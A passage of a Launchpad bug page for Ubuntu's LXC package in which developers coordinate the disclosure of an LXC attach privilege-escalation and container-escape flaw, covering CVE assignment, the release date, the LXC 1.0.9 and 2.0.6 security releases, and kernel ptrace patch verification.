That's still a security problem, but much less worse than a privileged escalation (in the case of a privileged attach process) and full container escape.


So as it stands, I think we'll want a CVE for the LXC side of this as even without the related kernel fix, the proposed fix does make things massively better by turning a privilege escalation + container escape issue into "just" an apparmor bypass issue.

As far as CRD, assuming we're all happy with the proposed fix. Anytime next week would be fine with me. If that's not an option, then the 1st or 2nd of December would work too.

I'm going to be mostly unavailable between the 28th and 30th and then again between the 5th and 9th so would rather avoid those days.


As usual, the plan will be for upstream LXC to push out security releases for the two supported branches as well as handle the announcement. So I'll be tagging LXC 1.0.9 and LXC 2.0.6 containing only this one fix on top of the latest stable release (1.0.8 and 2.0.5 respectively).

For Ubuntu, that means:
 - precise-backports: update to 1.0.9
 - trusty: update to 1.0.9
 - xenial: update to 2.0.6
 - yakkety: update to 2.0.6
 - zesty: update to 2.0.6

Once we've had a few more eyes on the proposed patch and have a CRD set in stone, I'll push all of the above in the private LXC security PPA, then on the CRD, the security team (or I) can just copy all of that stuff in the archive.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/33" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-15T21:34:30.532389+00:00" title="2016-11-15 21:34:30 UTC">on 2016-11-15</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/33"> #33</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Oh, forgot trusty-backports in the list above, that&#x27;ll be a backport of 2.0.6.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Oh, forgot trusty-backports in the list above, that'll be a backport of 2.0.6.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/34" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sforshee" class="sprite person">Seth Forshee (sforshee)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-15T22:59:20.316476+00:00" title="2016-11-15 22:59:20 UTC">on 2016-11-15</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/34"> #34</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>On the kernel side there was previously a CVE assigned for the ptrace issue - CVE-2015-8709. That restricted ptrace if the real, effective, and saved uids and gids of the process were not mapped into the ptracing process&#x27;s user ns, but that doesn&#x27;t forbid ptrace under the circumstances here.</p>
<p>We&#x27;ve applied Eric&#x27;s patch as the &quot;upstream replacement&quot; to the sauce patch we&#x27;ve been carrying, and it&#x27;s included in the current SRU cycle, which is due to be released to -updates on Nov 28 if there are no problems.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">On the kernel side there was previously a CVE assigned for the ptrace issue - CVE-2015-8709. That restricted ptrace if the real, effective, and saved uids and gids of the process were not mapped into the ptracing process's user ns, but that doesn't forbid ptrace under the circumstances here.

We've applied Eric's patch as the "upstream replacement" to the sauce patch we've been carrying, and it's included in the current SRU cycle, which is due to be released to -updates on Nov 28 if there are no problems.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/35" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-16T01:37:20.229824+00:00" title="2016-11-16 01:37:20 UTC">on 2016-11-16</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/35"> #35</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Patch looks good to me, thanks.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Patch looks good to me, thanks.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/36" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~henrix" class="sprite person">Luis Henriques (henrix)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-16T09:58:19.793574+00:00" title="2016-11-16 09:58:19 UTC">on 2016-11-16</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/36"> #36</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag &#x27;verification-<wbr />needed-<wbr />vivid&#x27; to &#x27;verification-<wbr />done-vivid&#x27;<wbr />.</p>
<p>If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.</p>
<p>See <a rel="nofollow" href="https://wiki.ubuntu.com/Testing/EnableProposed">https:/<wbr />/wiki.ubuntu.<wbr />com/Testing/<wbr />EnableProposed</a> for documentation how to enable and use -proposed. Thank you!</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-vivid' to 'verification-done-vivid'.

If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.

See https://wiki.ubuntu.com/Testing/EnableProposed for documentation how to enable and use -proposed. Thank you!
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        added: verification-needed-vivid
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        added: verification-needed-xenial
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/37" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~henrix" class="sprite person">Luis Henriques (henrix)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-16T10:02:27.176414+00:00" title="2016-11-16 10:02:27 UTC">on 2016-11-16</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/37"> #37</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag &#x27;verification-<wbr />needed-<wbr />xenial&#x27; to &#x27;verification-<wbr />done-xenial&#x27;<wbr />.</p>
<p>If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.</p>
<p>See <a rel="nofollow" href="https://wiki.ubuntu.com/Testing/EnableProposed">https:/<wbr />/wiki.ubuntu.<wbr />com/Testing/<wbr />EnableProposed</a> for documentation how to enable and use -proposed. Thank you!</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-xenial' to 'verification-done-xenial'.

If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.

See https://wiki.ubuntu.com/Testing/EnableProposed for documentation how to enable and use -proposed. Thank you!
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/38" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~henrix" class="sprite person">Luis Henriques (henrix)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-16T10:06:58.937078+00:00" title="2016-11-16 10:06:58 UTC">on 2016-11-16</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/38"> #38</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag &#x27;verification-<wbr />needed-<wbr />yakkety&#x27; to &#x27;verification-<wbr />done-yakkety&#x27;<wbr />.</p>
<p>If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.</p>
<p>See <a rel="nofollow" href="https://wiki.ubuntu.com/Testing/EnableProposed">https:/<wbr />/wiki.ubuntu.<wbr />com/Testing/<wbr />EnableProposed</a> for documentation how to enable and use -proposed. Thank you!</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-yakkety' to 'verification-done-yakkety'.

If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.

See https://wiki.ubuntu.com/Testing/EnableProposed for documentation how to enable and use -proposed. Thank you!
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        added: verification-needed-yakkety
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/39" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~roman-fiedler-deactivatedaccount" class="sprite person-inactive">Roman Fiedler (roman-fiedler-deactivatedaccount)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-16T15:31:00.938318+00:00" title="2016-11-16 15:31:00 UTC">on 2016-11-16</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/39"> #39</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p><span class="foldable-quoted">&gt; On the kernel side there was previously a CVE assigned for the ptrace issue - CVE-2015-8709. That restricted ptrace if the real, effective, and saved uids and gids of the process were not mapped into the ptracing process&#x27;s user ns, but that doesn&#x27;t forbid ptrace under the circumstances here.
</span></p>
<p>Isn&#x27;t that subverting the idea behind CVEs? It seems Redhat is already patched against that vulnerability:</p>
<p><a rel="nofollow" href="https://bugzilla.redhat.com/show_bug.cgi?id=1295287">https:/<wbr />/bugzilla.<wbr />redhat.<wbr />com/show_<wbr />bug.cgi?<wbr />id=1295287</a></p>
<p>Fedora Update System 2016-02-01 01:23:43 EST<br />
kernel-<wbr />4.3.4-200.<wbr />fc22 has been pushed to the Fedora 22 stable repository. If problems still persist, please make note of it in this bug report.</p>
<p>So basically they would have to reopen the issue and patch the same vuln again, although first patch was complete?</p>
<p>Or should we just accept that and wait for the first system to appear that is patched for CVE-2015-8709-A and not for CVE-2015-8709-B and then split the old entry into two?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">&gt; On the kernel side there was previously a CVE assigned for the ptrace issue - CVE-2015-8709. That restricted ptrace if the real, effective, and saved uids and gids of the process were not mapped into the ptracing process's user ns, but that doesn't forbid ptrace under the circumstances here.

Isn't that subverting the idea behind CVEs? It seems Redhat is already patched against that vulnerability:

https://bugzilla.redhat.com/show_bug.cgi?id=1295287

Fedora Update System 2016-02-01 01:23:43 EST
kernel-4.3.4-200.fc22 has been pushed to the Fedora 22 stable repository. If problems still persist, please make note of it in this bug report.

So basically they would have to reopen the issue and patch the same vuln again, although first patch was complete?

Or should we just accept that and wait for the first system to appear that is patched for CVE-2015-8709-A and not for CVE-2015-8709-B and then split the old entry into two?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/40" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-16T16:06:26+00:00" title="2016-11-16 16:06:26 UTC">on 2016-11-16</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/40"> #40</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>On 11/15/2016 04:59 PM, Seth Forshee wrote:<br />
<span class="foldable-quoted">
&gt; On the kernel side there was previously a CVE assigned for the ptrace<br />
&gt; issue - CVE-2015-8709. That restricted ptrace if the real, effective,<br />
&gt; and saved uids and gids of the process were not mapped into the ptracing<br />
&gt; process&#x27;s user ns, but that doesn&#x27;t forbid ptrace under the<br />
&gt; circumstances here.
</span></p>
<p>Please don&#x27;t reuse that CVE ID for this issue. It is clearly a different<br />
issue and reusing the CVE ID will only confuse everyone.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">On 11/15/2016 04:59 PM, Seth Forshee wrote:
&gt; On the kernel side there was previously a CVE assigned for the ptrace
&gt; issue - CVE-2015-8709. That restricted ptrace if the real, effective,
&gt; and saved uids and gids of the process were not mapped into the ptracing
&gt; process's user ns, but that doesn't forbid ptrace under the
&gt; circumstances here.

Please don't reuse that CVE ID for this issue. It is clearly a different
issue and reusing the CVE ID will only confuse everyone.

</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/41" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~roman-fiedler-deactivatedaccount" class="sprite person-inactive">Roman Fiedler (roman-fiedler-deactivatedaccount)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-16T16:45:52.030727+00:00" title="2016-11-16 16:45:52 UTC">on 2016-11-16</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/41"> #41</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Also my opinion. I just was wondering, because with that note, I was citing, also the CVE-2015-8709 reference seems to be added to this issue. I interpreted that as an attemt to reuse. If not, so why reference it, when it does not have something to do with it? For citing similar issues, should reference in note not be sufficient (Perhaps default behaviour of Launchpad software, would it add CVE-1970-0001 when just naming it?)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Also my opinion. I just was wondering, because with that note, I was citing, also the CVE-2015-8709 reference seems to be added to this issue. I interpreted that as an attemt to reuse. If not, so why reference it, when it does not have something to do with it? For citing similar issues, should reference in note not be sufficient (Perhaps default behaviour of Launchpad software, would it add CVE-1970-0001 when just naming it?)

</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/42" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sforshee" class="sprite person">Seth Forshee (sforshee)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-16T16:48:45+00:00" title="2016-11-16 16:48:45 UTC">on 2016-11-16</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/42"> #42</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>On Wed, Nov 16, 2016 at 04:06:26PM -0000, Tyler Hicks wrote:<br />
<span class="foldable-quoted">
&gt; On 11/15/2016 04:59 PM, Seth Forshee wrote:<br />
&gt; &gt; On the kernel side there was previously a CVE assigned for the ptrace<br />
&gt; &gt; issue - CVE-2015-8709. That restricted ptrace if the real, effective,<br />
&gt; &gt; and saved uids and gids of the process were not mapped into the ptracing<br />
&gt; &gt; process&#x27;s user ns, but that doesn&#x27;t forbid ptrace under the<br />
&gt; &gt; circumstances here.<br />
&gt;<br />
&gt; Please don&#x27;t reuse that CVE ID for this issue. It is clearly a different<br />
&gt; issue and reusing the CVE ID will only confuse everyone.
</span></p>
<p>Sorry, I didn&#x27;t really say what I meant to say there. Let me try again.</p>
<p>The patch does fix CVE-2015-8709. We aren&#x27;t &quot;reusing&quot; it. We&#x27;re<br />
replacing a sauce patch to fix that CVE with a (better) upstream patch,<br />
which is what we normally do when an upstream fix becomes available.</p>
<p>You&#x27;re right that the ptrace issue here is different than the one<br />
described by that CVE. Maybe that warrants another CVE, I&#x27;m not making<br />
claims either way about that. All I meant to say is that we&#x27;ve already<br />
taken the patch from Eric as an upstream replacement for the previous<br />
patch to fix CVE-2015-8709.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">On Wed, Nov 16, 2016 at 04:06:26PM -0000, Tyler Hicks wrote:
&gt; On 11/15/2016 04:59 PM, Seth Forshee wrote:
&gt; &gt; On the kernel side there was previously a CVE assigned for the ptrace
&gt; &gt; issue - CVE-2015-8709. That restricted ptrace if the real, effective,
&gt; &gt; and saved uids and gids of the process were not mapped into the ptracing
&gt; &gt; process's user ns, but that doesn't forbid ptrace under the
&gt; &gt; circumstances here.
&gt; 
&gt; Please don't reuse that CVE ID for this issue. It is clearly a different
&gt; issue and reusing the CVE ID will only confuse everyone.

Sorry, I didn't really say what I meant to say there. Let me try again.

The patch does fix CVE-2015-8709. We aren't "reusing" it. We're
replacing a sauce patch to fix that CVE with a (better) upstream patch,
which is what we normally do when an upstream fix becomes available.

You're right that the ptrace issue here is different than the one
described by that CVE. Maybe that warrants another CVE, I'm not making
claims either way about that. All I meant to say is that we've already
taken the patch from Eric as an upstream replacement for the previous
patch to fix CVE-2015-8709.
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/43" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-17T17:45:30.186498+00:00" title="2016-11-17 17:45:30 UTC">on 2016-11-17</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/43"> #43</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>FYI, updated ptrace patchset by Eric, sent for inclusion: <a rel="nofollow" href="https://lists.linuxfoundation.org/pipermail/containers/2016-November/037647.html">https:/<wbr />/lists.<wbr />linuxfoundation<wbr />.org/pipermail/<wbr />containers/<wbr />2016-November/<wbr />037647.<wbr />html</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
